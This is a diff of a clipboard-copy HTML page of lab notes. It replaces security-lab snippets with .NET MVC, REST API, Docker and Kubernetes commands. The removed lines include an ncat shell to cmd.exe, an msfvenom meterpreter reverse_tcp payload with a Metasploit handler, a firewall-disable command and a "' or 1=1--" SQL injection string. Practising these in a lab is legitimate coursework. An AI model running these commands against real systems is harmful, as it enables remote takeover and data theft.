@@ -4,39 +4,92 @@
   <title>Copy Multiline Variable Text to Clipboard</title>
 </head>
 <body>
-  <button onclick="copyMultilineText1()">RSA</button>
-  <button onclick="copyMultilineText2()">IP config</button>
-  <button onclick="copyMultilineText3()">Ncat</button>
-  <button onclick="copyMultilineText4()">maltego</button>
-  <button onclick="copyMultilineText5()">puttyssh</button>
-  <button onclick="copyMultilineText6()">wireshark</button>
-  <button onclick="copyMultilineText7()">sqll</button>
+  <button onclick="copyMultilineText1()">core mvc</button>
+  <button onclick="copyMultilineText2()">rest api</button>
+  <button onclick="copyMultilineText3()">docker com,img,cont</button>
+  <button onclick="copyMultilineText4()">software docker inst</button>
+  <button onclick="copyMultilineText5()">docker vol net</button>
+  <button onclick="copyMultilineText6()">circleci</button>
+  <button onclick="copyMultilineText7()">back serv asp.net</button>
+  <button onclick="copyMultilineText8()">kub</button>
   
   <script>
     function copyMultilineText1() {
       // Your variable containing multiline text data
       var yourMultilineVariable = `
       
-      Pip install crypto
-      Pip install pycryptodome
+      create MyMVC folder 
+cmd from mvc folder
+>dotnet new mvc --auth none
 
-      Encryption Code:-
-from Crypto.PublicKey import RSA
-from Crypto import Random
-from Crypto.Cipher import PKCS1_v1_5
-import binascii
-r = Random.new().read
-key = RSA.generate(4096,r)
-message = b'name'
-#Encryption
-cipher_encrypt = PKCS1_v1_5.new(key)
-encrypted_message = cipher_encrypt.encrypt(message)
-print("ENCRYPTED MESSAGE IS",binascii.hexlify(encrypted_message))
+mod HomeController.cs
 
-Decryption Code:-
-cipher_decrypt = PKCS1_v1_5.new(key)
-decrypted_message = cipher_decrypt.decrypt(encrypted_message, None)
-print("DECRYPTED MESSAGE IS", decrypted_message)`;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Threading.Tasks;
+using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Logging;
+using MyMVC.Models;
+namespace MyMVC.Controllers
+{ public class HomeController : Controller
+{
+public String Index()
+{ return " KFMSCIT0  name "; }
+}
+}
+
+>dotnet run
+
+
+model -> create new StockQuote.cs
+
+using System;
+namespace MyMVC.Models
+{
+public class StockQuote
+{ public string Symbol {get;set;}
+public int Price{get;set;}
+}
+}
+
+
+view -> home ->  index.cshtml
+
+@{
+ViewData["Title"] = "Home Page";
+}
+<div>
+Symbol: @Model.Symbol <br/>
+Price: $@Model.Price <br/>
+</div>
+
+
+mod HomeController.cs
+
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Threading.Tasks;
+using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Logging;
+using MyMVC.Models;
+namespace MyMVC.Controllers
+{
+public class HomeController : Controller
+{ public async Task <IActionResult> Index()
+{
+var model= new StockQuote{ Symbol="HELLO", Price=3200};
+return View(model);
+}
+}
+}
+
+>dotnet run
+      
+      `;
 
       // Assign the variable's value to the text variable
       var text = yourMultilineVariable;
@@ -64,11 +117,146 @@ print("DECRYPTED MESSAGE IS", decrypted_message)`;
       // Your variable containing multiline text data
       var yourMultilineVariable = `
       
-      ipconfig
-      ipconfig/all
-      ipconfig/displaydns
-      ipconfig/flushdns
-      wmic os get osarchitecture
+      prac folder>dotnet new webapi -o Gloosary
+>cd Glossary
+>dotnet run
+
+weatherforecast.cs
+
+//GlossaryItem.cs
+namespace Glossary
+{
+public class GlossaryItem
+{
+public string Term { get; set; } = string.Empty;
+public string Definition { get; set; } = string.Empty;
+}
+}
+
+cmd 2
+
+curl --insecure http://localhost:XXXX/weatherforecast
+
+add GlossaryItems.cs in Glossary 
+
+//GlossaryItem.cs
+namespace Glossary {
+public class GlossaryItem{
+public string Term { get; set; }
+public string Definition { get; set; }}}
+
+add GlossaryController.cs in Glossary\Controllers\
+
+//Controllers/GlossaryController.cs
+using System;
+using System.Collections.Generic;
+using Microsoft.AspNetCore.Mvc;
+using System.IO;
+namespace Glossary.Controllers
+{
+[ApiController]
+[Route("api/[controller]")]
+public class GlossaryController: ControllerBase
+{
+private static List<GlossaryItem> Glossary = new List<GlossaryItem> {
+new GlossaryItem
+{
+Term= "HTML",
+Definition = "Hypertext Markup Language"
+},
+new GlossaryItem
+{
+Term= "MVC",
+Definition = "Model View Controller"
+},
+new GlossaryItem
+{
+Term= "OpenID",
+Definition = "An open standard for authentication"
+}
+};
+[HttpGet]
+public ActionResult<List<GlossaryItem>> Get()
+{ return Ok(Glossary);
+}
+[HttpGet]
+[Route("{term}")]
+public ActionResult<GlossaryItem> Get(string term)
+{
+var glossaryItem = Glossary.Find(item =>
+item.Term.Equals(term, StringComparison.InvariantCultureIgnoreCase));
+if (glossaryItem == null)
+{ return NotFound();
+} else
+{
+return Ok(glossaryItem);
+}
+}
+[HttpPost]
+public ActionResult Post(GlossaryItem glossaryItem)
+{
+var existingGlossaryItem = Glossary.Find(item =>
+item.Term.Equals(glossaryItem.Term, StringComparison.InvariantCultureIgnoreCase));
+if (existingGlossaryItem != null)
+{
+return Conflict("Cannot create the term because it already exists.");
+}
+else
+{
+Glossary.Add(glossaryItem);
+var resourceUrl = Path.Combine(Request.Path.ToString(), Uri.EscapeDataString(glossaryItem.Term));
+return Created(resourceUrl, glossaryItem);
+}
+}
+[HttpPut]
+public ActionResult Put(GlossaryItem glossaryItem)
+{
+var existingGlossaryItem = Glossary.Find(item =>
+item.Term.Equals(glossaryItem.Term, StringComparison.InvariantCultureIgnoreCase));
+if (existingGlossaryItem == null)
+{
+return BadRequest("Cannot update a nont existing term.");
+} else
+{
+existingGlossaryItem.Definition = glossaryItem.Definition;
+return Ok();
+}
+}
+[HttpDelete]
+[Route("{term}")]
+public ActionResult Delete(string term)
+{
+var glossaryItem = Glossary.Find(item =>
+item.Term.Equals(term, StringComparison.InvariantCultureIgnoreCase));
+if (glossaryItem == null)
+{ return NotFound();
+}
+else
+{ Glossary.Remove(glossaryItem);
+return NoContent();
+}
+}
+}
+}
+
+
+open cmd in glossary > dotnet run
+
+cmd 2 
+
+open cmd in C > curl --insecure http://localhost:XXXX/api/glossary
+
+curl --insecure https://localhost:XXXX/api/glossary/MVC
+
+curl --insecure -X POST -d "{\"term\": \"MFA\", \"definition\":\"An authentication process.\"}" -H
+"Content-Type:application/json" https://localhost:XXXX/api/glossary
+
+curl --insecure -X PUT -d "{\"term\": \"MVC\", \"definition\":\"Modified record of Model View
+Controller.\"}" -H "Content-Type:application/json" http://localhost:XXXX/api/glossary
+
+curl --insecure --request DELETE --url http://localhost:XXXX/api/glossary/openid
+
+     
       `;
 
       // Assign the variable's value to the text variable
@@ -96,30 +284,34 @@ print("DECRYPTED MESSAGE IS", decrypted_message)`;
      function copyMultilineText3() {
       // Your variable containing multiline text data
       var yourMultilineVariable = `
+      Method 1:
+      docker --version
+docker pull rocker/verse
+docker images
 
-      ufw disable
-      nc -lvp 555
-      ncat kaliipadd -e cmd.exe
-      cd name
+Go to docker hub and create a repository
 
-      msfconsole
-      msfvenom
+docker login --username=mitalivis
 
-      msfvenom -p windows/meterpreter/reverse_tcp lhost=kaliipadd lport=5555 -f exe> /home/kali/Desktop/foldername/reverse_tcp.exe
+after tag put image id which you got from docker images
+docker tag 36d2b6f2a7b3 mitalivis/mitali_041:firsttry
+
+docker push mitalivis/mitali_041:firsttry
+
+go to docker hub image is pushed
+
+MEthod 2:
+cat > Dockerfile <<EOF
+FROM busybox
+CMD echo "Hello world! This is Name"
+EOF
+
+docker build –t username/reponame .
+docker images
+docker push username/reponame
+docker push username/reponame
+
       
-      use exploit
-
-      new kaliterminal : python -m http.server
-
-      back to the termial where you wrote msfvenom
-
-      use exploit/multi/handler
-      set playload windows/meterpreter/reverse_tcp
-      set lhost 192.168.100.111
-      set lport 5555
-      exploit
-
-      shell
       `;
 
       // Assign the variable's value to the text variable
@@ -148,7 +340,6 @@ print("DECRYPTED MESSAGE IS", decrypted_message)`;
       // Your variable containing multiline text data
       var yourMultilineVariable = `
       
-      maltego
       
       
       `;
@@ -179,21 +370,27 @@ print("DECRYPTED MESSAGE IS", decrypted_message)`;
       // Your variable containing multiline text data
       var yourMultilineVariable = `
 
-      ifconfig
+      docker pull nginx
+Click on Port and enter 80 in the dropdown 
 
-      cd /home
-      mkdir foldername
-      cd name
-      cat > abc.txt
-      write something
+docker volume create MyVolume
+docker volume ls
+docker volume inspect MyVolume
 
-      apt update
-      apt install openssh-server
-      ufw status
-      ufw enable
-      ufw allow 22/tcp
-      service ssh start
-      service ssh status
+*create a webapp*
+docker run -d --name=webapp3 --mount source=MyVolume,destination=/usr/share/nginx/html -p 80:80 nginx
+
+ls /
+cd /var/lib/docker
+ls
+cd volumes
+ls
+cd MyVolume
+ls
+cd _data
+echo "From MyVolume, Mitali Vishwekar 041"> index.html
+docker stop webapp3
+
 
 
 `;
@@ -223,38 +420,9 @@ print("DECRYPTED MESSAGE IS", decrypted_message)`;
     function copyMultilineText6() {
       // Your variable containing multiline text data
       var yourMultilineVariable = `
-
+circleci
 
 `;
-
-      // Assign the variable's value to the text variable
-      var text = yourMultilineVariable;
-
-      // Create a temporary textarea element to hold the text
-      var tempTextArea = document.createElement("textarea");
-      tempTextArea.value = text;
-
-      // Append the textarea element to the DOM
-      document.body.appendChild(tempTextArea);
-
-      // Select the text in the textarea
-      tempTextArea.select();
-      tempTextArea.setSelectionRange(0, 99999); /* For mobile devices */
-
-      // Copy the selected text to the clipboard
-      document.execCommand("copy");
-
-      // Remove the temporary textarea
-      document.body.removeChild(tempTextArea);
-
-      
-    }
-    function copyMultilineText6() {
-      // Your variable containing multiline text data
-      var yourMultilineVariable = ` 
-      http.request.method == "POST"
-      
-      `;
 
       // Assign the variable's value to the text variable
       var text = yourMultilineVariable;
@@ -281,9 +449,90 @@ print("DECRYPTED MESSAGE IS", decrypted_message)`;
     function copyMultilineText7() {
       // Your variable containing multiline text data
       var yourMultilineVariable = ` 
-      altoro mutual
       
-      ' or 1=1--
+      1)
+>docker run -d -p 5000:5000 -e PORT=5000 \
+>-e LOCATION_URL=http://localhost:5001 \
+>dotnetcoreservices/teamservice:location
+
+2)
+>docker run -d -p 5001:5001 -e PORT=5001 \
+>dotnetcoreservices/locationservice:nodb
+
+3)
+docker images
+
+4)
+>curl -H "Content-Type:application/json" -X POST -d \
+>'{"id":"e52baa63-d511-417e-9e54-7aab04286281","name":"KC"}' http://localhost:5000/teams
+
+5)
+curl http://localhost:5000/teams/e52baa63-d511-417e-9e54-7aab04286281
+
+6)
+>curl -H "Content-Type:application/json" -X POST -d \
+>'{"id":"63e7acf8-8fae-42ce-9349-3c8593ac8292", "firstName":"Mitali", "lastName":"Vishwekar"}' http://localhost:5000/teams/e52baa63-d511-417e-9e54-7aab04286281/members
+
+7)
+>curl http://localhost:5000/teams/e52baa63-d511-417e-9e54-7aab04286281
+
+8)
+>curl -H "Content-Type:application/json" -X POST -d \
+>'{"id":"64c3e69f-1580-4b2f-a9ff-2c5f3b8f0e1f", "latitude":12.0,"longitude":12.0,"altitude":10.0, "timestamp":0,"memberId":"63e7acf8-8fae-42ce-9349-3c8593ac8292"}' http://localhost:5001/locations/63e7acf8- 8fae-42ce-9349-3c8593ac8292
+
+9)
+>curl http://localhost:5001/locations/63e7acf8-8fae-42ce-9349-3c8593ac8292
+
+      `;
+
+      // Assign the variable's value to the text variable
+      var text = yourMultilineVariable;
+
+      // Create a temporary textarea element to hold the text
+      var tempTextArea = document.createElement("textarea");
+      tempTextArea.value = text;
+
+      // Append the textarea element to the DOM
+      document.body.appendChild(tempTextArea);
+
+      // Select the text in the textarea
+      tempTextArea.select();
+      tempTextArea.setSelectionRange(0, 99999); /* For mobile devices */
+
+      // Copy the selected text to the clipboard
+      document.execCommand("copy");
+
+      // Remove the temporary textarea
+      document.body.removeChild(tempTextArea);
+
+      
+    }
+    function copyMultilineText8() {
+      // Your variable containing multiline text data
+      var yourMultilineVariable = ` 
+
+open play with kubernetes
+
+1) Master node
+ kubeadm init --apiserver-advertise-address $(hostname -i) --pod-network-cidr 10.5.0.0/16
+
+2) cluster node
+kubectl apply -f https://raw.githubusercontent.com/cloudnativelabs/kube-router/master/daemonset/kubeadm-kuberouter.yaml
+
+3)create new instant
+kubeadm join 192.168.0.23:6443 --token lxrthc.g8ntfqzygpmw54rd \
+        --discovery-token-ca-cert-hash sha256:2b357896a98bf5337255482f2af34a3e5740298083b59914ac3a39b6f4779df3
+
+4)
+kubectl create deployment my-dep --image=nginx --replicas=3
+
+Basic Commands
+View the nodes available - kubectl get nodes  
+View the pods available - kubectl get pods
+View the Services available - kubectl get services
+Check the version - docker -v
+
+      
       `;
 
       // Assign the variable's value to the text variable
